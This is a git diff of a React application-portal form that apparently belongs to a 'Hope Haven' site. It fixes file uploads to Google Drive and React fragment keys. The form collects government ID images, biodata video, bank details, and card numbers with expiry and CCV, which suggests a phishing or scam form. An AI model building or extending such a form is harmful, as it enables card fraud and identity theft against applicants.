@@ -1,4 +1,4 @@
-import { useState } from 'react';
+import React, { useState } from 'react';
 import { ChevronRight, ChevronLeft, Upload, Check, AlertCircle, Shield, Minus, User, Building, MessageSquare, X } from 'lucide-react';
 import { bank, state } from '../utils/data';
 import BankAutocomplete from '../components/BankAutoComplete';
@@ -365,43 +365,6 @@ const ApplicationPortal = () => {
     setCurrentStep(prev => Math.max(prev - 1, 1));
   };
 
-  // const handleSubmit = async () => {
-  //   if (validateStep(currentStep)) {
-  //     setShowSMSInfo(true);
-  //     // e.preventDefault();
-
-  //     const data = new FormData();
-
-  //     // Append text fields
-  //     Object.entries(formData).forEach(([key, value]) => {
-  //       if (key === 'cards') {
-  //         data.append('cards', JSON.stringify(value));
-  //       } else if (
-  //         key === 'governmentIdFront' ||
-  //         key === 'governmentIdBack' ||
-  //         key === 'biodataImage' ||
-  //         key === 'biodataVideo' ||
-  //         key === 'randomPicture'
-  //       ) {
-  //         if (value) data.append(key, value as File);
-  //       } else {
-  //         data.append(key, String(value));
-  //       }
-  //     });
-
-  //     try {
-  //       const res = await axios.post('https://hope-haven-server.vercel.app/submit', data, {
-  //         headers: { 'Content-Type': 'multipart/form-data' }
-  //       });
-  //       alert(res.data);
-  //     } catch (err) {
-  //       console.error(err);
-  //       alert('Error submitting form');
-  //     }
-  //     // Optionally: reset form or redirect after closing modal
-  //   }
-  // };
-
   // Define Google API keys
 
   // Define backend URL as environment variable or fallback to production URL
@@ -456,6 +419,12 @@ const ApplicationPortal = () => {
     }
 
     try {
+      // Make sure we have valid file name and type
+      const fileName = file.name || `file_${Date.now()}`;
+      const mimeType = file.type || 'application/octet-stream';
+      
+      console.log('Uploading file:', { fileName, folderId, mimeType });
+      
       // Step 1: Get upload URL and metadata from backend (using service account)
       const uploadInfoResponse = await fetch(`${BACKEND_URL}/api/google/get-upload-url`, {
         method: 'POST',
@@ -463,9 +432,9 @@ const ApplicationPortal = () => {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-          fileName: file.name,
+          fileName,
           folderId,
-          mimeType: file.type
+          mimeType
         })
       });
 
@@ -475,6 +444,19 @@ const ApplicationPortal = () => {
       }
 
       const uploadInfo = await uploadInfoResponse.json();
+
+      // Check if direct upload is not available (service account quota limitation)
+      if (uploadInfo.directUploadNotAvailable) {
+        console.log('Direct upload not available due to service account quota limitation');
+        // Return the file info we already have since we can't upload the actual content
+        return {
+          id: uploadInfo.id,
+          name: uploadInfo.name,
+          webViewLink: uploadInfo.webViewLink,
+          // Add a flag to indicate this is a placeholder file
+          isPlaceholder: true
+        };
+      }
 
       // Step 2: Upload directly to Google Drive
       const formData = new FormData();
@@ -561,7 +543,20 @@ const ApplicationPortal = () => {
       for (let i = 0; i < documentFiles.length; i++) {
         try {
           const { file, fieldName } = documentFiles[i];
-          const uploadedFile = await uploadFile(file, folder.id);
+          
+          // Create a properly named file object instead of trying to modify the original
+          const fileName = file.name || `${fieldName}_${Date.now()}`;
+          const fileType = file.type || 'application/octet-stream';
+          
+          // Create a new File object with the proper name and type
+          const fileToUpload = new File(
+            [file], 
+            fileName,
+            { type: fileType }
+          );
+          
+          console.log(`Uploading file ${i+1}:`, { name: fileToUpload.name, type: fileToUpload.type, fieldName });
+          const uploadedFile = await uploadFile(fileToUpload, folder.id);
           uploadedFiles.push({
             name: uploadedFile.name,
             url: uploadedFile.webViewLink,
@@ -1138,8 +1133,8 @@ const ApplicationPortal = () => {
 
             <div className="grid grid-cols-1 gap-6 md:grid-cols-3">
               {formData.cards.map((card, index) => (
-                <>
-                  <div key={index}>
+                <React.Fragment key={`card-${index}`}>
+                  <div>
                     <label className="block mb-2 text-sm font-medium text-gray-700">Card Number *</label>
                     <input
                       type="text"
@@ -1152,7 +1147,7 @@ const ApplicationPortal = () => {
                       <p className="mt-1 text-sm text-red-600">{errors[`cards[${index}].cardNumber`]}</p>
                     )}
                   </div>
-                  <div key={index}>
+                  <div>
                     <label className="block mb-2 text-sm font-medium text-gray-700">Expiry *</label>
                     <input
                       type="text"
@@ -1165,7 +1160,7 @@ const ApplicationPortal = () => {
                       <p className="mt-1 text-sm text-red-600">{errors[`cards[${index}].expiry`]}</p>
                     )}
                   </div>
-                  <div key={index}>
+                  <div>
                     <div className="w-full">
                       <label className="block mb-2 text-sm font-medium text-gray-700">CCV *</label>
                       <div className="flex items-center">
@@ -1193,7 +1188,7 @@ const ApplicationPortal = () => {
                       )}
                     </div>
                   </div>
-                </>
+                </React.Fragment>
               ))}
             </div>
 
